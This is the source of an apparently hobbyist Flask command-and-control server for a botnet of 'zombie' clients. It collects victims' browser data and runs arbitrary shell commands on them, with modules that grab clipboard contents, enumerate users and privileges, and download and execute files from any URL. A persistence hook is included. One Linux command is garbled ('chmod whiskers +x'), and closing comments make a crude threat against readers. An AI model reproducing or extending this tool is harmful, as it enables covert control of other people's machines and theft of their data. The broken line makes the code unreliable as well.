from flask import Flask, render_template, jsonify, request, redirect, url_for, session
from flask_sock import Sock
import json
import random
import time
import logging
import re
import os
import socket
import sys

# Suppress Flask logging
logging.getLogger('werkzeug').setLevel(logging.ERROR)
logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Clear the Terminal function
def clearscreen():
    os.system('cls' if os.name=='nt' else 'clear')
clearscreen()

# Redirect stdout to devnull during app startup
class SuppressOutput:
    def __enter__(self):
        self._original_stdout = sys.stdout
        sys.stdout = open(os.devnull, 'w')
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        sys.stdout.close()
        sys.stdout = self._original_stdout

app = Flask(__name__)
app.secret_key = 'zombies_fixed_secret_key_2023'
sock = Sock(app)

connected_clients = {}
client_data = []
script_responses = {}
shell_sessions = {}

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_license_key():
    def generate_segment():
        return ''.join(random.choices('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=4))
    key = f"{generate_segment()}-{generate_segment()}-{generate_segment()}"
    return key

KEY_FILE = 'key.txt'
LICENSE_KEY = generate_license_key()

try:
    with open(KEY_FILE, 'w') as f:
        f.write(LICENSE_KEY)
except Exception as e:
    logger.error(f"Error writing license key to {KEY_FILE}: {e}")

persistence_script = ""
disconnect_script = "pkill -f 'python.*client.py'"

@app.route('/')
def index():
    if 'authenticated' not in session:
        return redirect(url_for('login'))
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'authenticated' in session:
        session.pop('authenticated', None)
    
    if request.method == 'POST':
        license_key = request.form.get('license_key')
        if license_key == LICENSE_KEY:
            session['authenticated'] = True
            session.permanent = True
            return redirect(url_for('index'))
        else:
            return render_template('login.html', error="Invalid license key")
    
    return render_template('login.html')

@app.route('/api/clients', methods=['GET'])
def get_clients():
    if 'authenticated' not in session:
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify({
        "totalClients": len(client_data),
        "activeSessions": len(connected_clients),
        "pendingTasks": random.randint(0, 10),
        "clients": client_data,
        "timestamp": time.time()
    })

@app.route('/api/run_script/<client_id>', methods=['POST'])
def run_script(client_id):
    if 'authenticated' not in session:
        return jsonify({"error": "Unauthorized"}), 401
    if client_id not in connected_clients:
        return jsonify({"status": "error", "message": "Client not connected"}), 404
    
    data = request.get_json()
    shell = data.get("shell")
    script = data.get("script")
    request_id = str(time.time())
    
    if not shell or not script:
        return jsonify({"status": "error", "message": "Shell and script are required"}), 400
    
    try:
        message = {
            "type": "script",
            "shell": shell,
            "script": script,
            "request_id": request_id,
            "is_shell_session": data.get("is_shell_session", False)
        }
        connected_clients[client_id].send(json.dumps(message))
        return jsonify({"status": "success", "message": f"Script sent to {client_id}", "request_id": request_id})
    except Exception as e:
        logger.error(f"Error sending script to {client_id}: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/run_persistence/<client_id>', methods=['POST'])
def run_persistence(client_id):
    if 'authenticated' not in session:
        return jsonify({"error": "Unauthorized"}), 401
    if client_id not in connected_clients:
        return jsonify({"status": "error", "message": "Client not connected"}), 404
    
    try:
        request_id = str(time.time())
        message = {
            "type": "script",
            "shell": "bash",
            "script": persistence_script,
            "request_id": request_id
        }
        connected_clients[client_id].send(json.dumps(message))
        return jsonify({"status": "success", "message": f"Persistence script sent to {client_id}", "request_id": request_id})
    except Exception as e:
        logger.error(f"Error sending persistence script to {client_id}: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/script_response/<request_id>', methods=['GET'])
def get_script_response(request_id):
    if 'authenticated' not in session:
        return jsonify({"error": "Unauthorized"}), 401
    response = script_responses.get(request_id, {"status": "pending", "result": "Waiting for response..."})
    return jsonify(response)

@sock.route('/ws')
def websocket(ws):
    client_id = None
    try:
        while True:
            message = ws.receive(timeout=30)
            if message is None:
                ws.send(json.dumps({"type": "ping"}))
                continue
                
            data = json.loads(message)
            if data.get("type") == "script_response":
                script_responses[data['request_id']] = {
                    "status": "success",
                    "client_id": data['client_id'],
                    "result": data['result'],
                    "is_shell_session": data.get("is_shell_session", False)
                }
                continue
            
            client_id = data.get("client_id")
            if not client_id or not isinstance(client_id, str) or not re.match(r"\d{3}-\d{3}-\d{3}", client_id):
                ws.send(json.dumps({"type": "error", "message": "Invalid client ID format"}))
                ws.close()
                return

            connected_clients[client_id] = ws
            
            existing = next((c for c in client_data if c["id"] == client_id), None)
            if existing:
                existing.update({
                    "name": data["name"],
                    "status": data["status"],
                    "lastActive": data["lastActive"],
                    "os": data["os"],
                    "browser_data": data.get("browser_data", {})
                })
            else:
                client_data.append({
                    "id": client_id,
                    "name": data["name"],
                    "status": data["status"],
                    "lastActive": data["lastActive"],
                    "os": data["os"],
                    "browser_data": data.get("browser_data", {})
                })

    except Exception as e:
        logger.error(f"WebSocket error: {e}")
    finally:
        if client_id and client_id in connected_clients:
            del connected_clients[client_id]
            for client in client_data:
                if client["id"] == client_id:
                    client["status"] = "offline"

def run_script_command(script_name, client_id):
    if client_id not in connected_clients:
        return {"status": "error", "message": "Client not connected"}
    
    client_os = next((c["os"] for c in client_data if c["id"] == client_id), "")
    is_windows = "Windows" in client_os
    
    commands = {
        "disconnect": {
            "windows": {"script": "taskkill /F /IM python.exe", "shell": "powershell"},
            "linux": {"script": "pkill -f 'python.*client.py'", "shell": "bash"}
        },
        "sysinfo": {
            "windows": {"script": "systeminfo", "shell": "powershell"},
            "linux": {"script": "uname -a && lscpu && free -h && df -h", "shell": "bash"}
        },
        "shell": {
            "windows": {"script": "cmd.exe /c", "shell": "powershell"},
            "linux": {"script": "", "shell": "bash"}
        },
        "privs": {
            "windows": {"script": "whoami /all", "shell": "powershell"},
            "linux": {"script": "id && sudo -l", "shell": "bash"}
        },
        "upload": {
            "windows": {"script": "$url = $args[0]; $output = Join-Path $env:TEMP 'downloaded_file.exe'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process $output", "shell": "powershell"},
            "linux": {"script": "url=$1; output=/tmp/downloaded_file; curl -o $output $url; chmod whiskers +x $output; $output", "shell": "bash"}
        },
        "processes": {
            "windows": {"script": "Get-Process | Select-Object Id,ProcessName,CPU,WorkingSet,Path", "shell": "powershell"},
            "linux": {"script": "ps aux", "shell": "bash"}
        },
        "network": {
            "windows": {"script": "ipconfig /all && netstat -ano", "shell": "powershell"},
            "linux": {"script": "ip a && netstat -tulpn", "shell": "bash"}
        },
        "users": {
            "windows": {"script": "net user", "shell": "powershell"},
            "linux": {"script": "cat /etc/passwd && who", "shell": "bash"}
        },
        "drives": {
            "windows": {"script": "Get-PSDrive -PSProvider 'FileSystem'", "shell": "powershell"},
            "linux": {"script": "df -h && lsblk", "shell": "bash"}
        },
        "services": {
            "windows": {"script": "Get-Service | Where-Object {$_.Status -eq 'Running'}", "shell": "powershell"},
            "linux": {"script": "systemctl list-units --type=service --state=running", "shell": "bash"}
        },
        "firewall": {
            "windows": {"script": "netsh advfirewall show allprofiles", "shell": "powershell"},
            "linux": {"script": "sudo iptables -L -v -n", "shell": "bash"}
        },
        "software": {
            "windows": {"script": "Get-WmiObject -Class Win32_Product | Select-Object Name,Version", "shell": "powershell"},
            "linux": {"script": "dpkg -l || rpm -qa", "shell": "bash"}
        },
        "clipboard": {
            "windows": {"script": "Get-Clipboard", "shell": "powershell"},
            "linux": {"script": "xclip -o -selection clipboard 2>/dev/null || echo 'xclip not installed'", "shell": "bash"}
        }
    }

    parts = script_name.split()
    cmd_name = parts[0].lower()
    args = parts[1:] if len(parts) > 1 else []

    if cmd_name == "help":
        help_text = """
Basic Commands:
--------------
clear         : Clears the console output
help          : Shows this help message
persistence   : Executes persistence script on specified client
list clients  : Displays a list of connected clients

Available Modules:
----------------
sysinfo       : Show system information
processes     : List running processes
network       : Show network configuration and connections
users         : List system users
drives        : Show disk drives and usage
services      : List running services
firewall      : Show firewall configuration
software      : List installed software
clipboard     : Get clipboard content
privs         : Check local privileges
disconnect    : Disconnect the client

Special Commands:
---------------
upload <url>  : Download and execute file from URL
shell <cmd>   : Execute shell command

Usage Examples:
-------------
module sysinfo 123-456-789     : Get system info from client
module shell 123-456-789 dir   : Run 'dir' command on client
module upload 123-456-789 <url>: Download and run file on client
"""
        return {"status": "success", "message": help_text}

    if cmd_name not in commands:
        return {"status": "error", "message": f"Unknown command: {cmd_name}. Type 'help' for available commands."}

    os_type = "windows" if is_windows else "linux"
    cmd_config = commands[cmd_name][os_type]
    
    if cmd_name == "upload" and not args:
        return {"status": "error", "message": "Upload command requires URL. Usage: upload <url>"}
    
    if cmd_name == "shell" and not args:
        return {"status": "error", "message": "Shell command requires command string. Usage: shell <command>"}

    script_content = cmd_config["script"]
    if cmd_name == "shell":
        script_content = " ".join(args)
    elif cmd_name == "upload":
        script_content = script_content.replace("$args[0]", args[0])
        script_content = script_content.replace("$1", args[0])

    try:
        request_id = str(time.time())
        message = {
            "type": "script",
            "shell": cmd_config["shell"],
            "script": script_content,
            "request_id": request_id
        }
        connected_clients[client_id].send(json.dumps(message))
        return {
            "status": "success", 
            "message": f"Command '{cmd_name}' sent to {client_id}", 
            "request_id": request_id
        }
    except Exception as e:
        logger.error(f"Error sending command {cmd_name} to {client_id}: {e}")
        return {"status": "error", "message": str(e)}

if __name__ == "__main__":
    local_ip = get_local_ip()
    print(f"[*] Server online at {local_ip}:8000")
    print(f"[*] Login Key {LICENSE_KEY}")
    print(f"\n[!] Check key.txt, if the key doesent work\n[!] Still underdev #made by nullkiss/ elofinky")
    
    with SuppressOutput():
        app.run(host='0.0.0.0', port=8000, debug=False, use_reloader=False)

        # https://github.com/elofinky 
        # check my profile out maby star it
        # if you dont, this is you ip "127.0.0.1"
        # yea im not joking huh *smugs
        # il come to "127.0.0.1" if you dont star
        # and i will eat you tight lit...